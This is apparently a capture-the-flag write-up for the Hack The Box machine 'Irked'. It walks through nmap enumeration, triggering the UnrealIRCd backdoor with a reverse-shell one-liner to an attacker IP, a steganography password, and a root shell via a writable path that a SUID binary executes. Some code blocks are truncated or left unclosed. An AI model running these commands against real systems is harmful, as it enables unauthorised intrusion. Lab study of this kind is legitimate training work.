## Description:
Easy rated linux machine. Good box to learn some stego and also good for practicing privilege escalation for OSCP.

## Enumeration

Add `irked.htb` to `hosts` and start an `nmap` scan.

### Nmap

```bash
# Nmap 7.80 scan initiated Tue Sep  1 17:05:19 2020 as: nmap -sS -T4 -p- -vvvv -oN nmap.full irked.htb
Increasing send delay for 10.10.10.117 from 0 to 5 due to 320 out of 799 dropped probes since last increase.

Host is up, received echo-reply ttl 63 (0.40s latency).

# Nmap done at Tue Sep  1 17:19:55 2020 -- 1 IP address (1 host up) scanned in 875.58 seconds

```

Ports `80` and `6697` looks interesting.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/htbimg/irked/web.png){: .align-center}

Investigating port `80` does not reveal much. There is just an image in the index page. No other interesting files or directories could be found.

### IRC port 6697

Moving on to port `6697`, connecting using `nc` gives a banner. 

```bash
kali@kali:~/Desktop/htb/irked$ nc irked.htb 6697
:irked.htb NOTICE AUTH :*** Looking up your hostname...
```

We can try out a `nmap` scan on the port.

```bash
# Nmap 7.80 scan initiated Mon Aug 31 21:11:32 2020 as: nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 -oN irc_nmap irked.htb
Nmap scan report for irked.htb (10.10.10.117)
Host is up (0.28s latency).
Not shown: 341 closed ports
PORT     STATE SERVICE VERSION
6697/tcp open  irc     UnrealIRCd
| irc-botnet-channels: 
|_  ERROR: Closing Link: [10.10.14.21] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 31 21:11:43 2020 -- 1 IP address (1 host up) scanned in 11.61 seconds
```

We can see that the scan has identified the `irc` server as `unrealIRCd`.

### Searchsploit

```bash

Shellcodes: No Results
```

And we have some `RCE` exploits.

## Low Shell

Reading up the exploit shows that there is a backdoor in the software that is triggered when we enter the keyword `AB;`. Run a reverse shell payload to get shell.

```bash
kali@kali:~/Desktop/htb/irked$ nc irked.htb 6697
:irked.htb NOTICE AUTH :*** Looking up your hostname...
AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.21 443 >/tmp/f
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
```

On the listener, we get a connection.

```bash
kali@kali:~/Desktop/htb/irked$ sudo nc -lvp 443
[sudo] password for kali:
listening on [any] 443 ...
connect to [10.10.14.21] from irked.htb [10.10.10.117] 54581
bash: cannot set terminal process group (641): Inappropriate ioctl for device
bash: no job control in this shell
ircd@irked:~/Unreal3.2$ id
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

We have a shell as user `ircd`.
## User Shell

We have a limited shell right now. Looking through the directories of user `djmardov`, we can see a backup file.

```bash
ircd@irked:/home/djmardov/Documents$ ls -la
ls -la
total 16
drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
ircd@irked:/home/djmardov/Documents$ cat .backup
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

There is a hint that this is somehow related to stegnography. We can try analyzing the image on the front page using `steghide` to see if we can uncover something.

```bash
kali@kali:~/Desktop/htb/irked$ wget http://irked.htb/irked.jpg

We can try sshing into the box using this password.

```bash
kali@kali:~/Desktop/htb/irked$ ssh djmardov@irked.htb
djmardov@irked.htb's password:

## Root Shell

Looking at files with `suid` bit, we can see an unusual binary name `viewuser`

```bash
djmardov@irked:~$ find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device

/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
djmardov@irked:~$
```

We can run the binary with `pspy` running in the background to understand what it does.

### PSPY Analysis

```bash
djmardov@irked:/tmp$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-09-01 04:34 (:0)
djmardov pts/0        2020-09-01 07:57 (10.10.14.21)
sh: 1: /tmp/listusers: not found
```
The binary throws an error stating that the file `/tmp/listusers` does not exist.

```bash
2020/09/01 00:30:26 CMD: UID=0    PID=1      | /sbin/init

2020/09/01 00:32:21 CMD: UID=0    PID=2064   |
```

`pspy` shows that the binary is executing the contents of `/tmp/listusers`


Lets echo `/bin/sh` to `/tmp/listusers` and run `viewusers`.

```bash
djmardov@irked:/tmp$ echo "/bin/sh" > /tmp/listusers
djmardov@irked:/tmp$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed

sh: 1: /tmp/listusers: Permission denied
djmardov@irked:/tmp$ chmod 777 listusers
djmardov@irked:/tmp$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-09-01 04:34 (:0)

# id

#
```

And we are root.
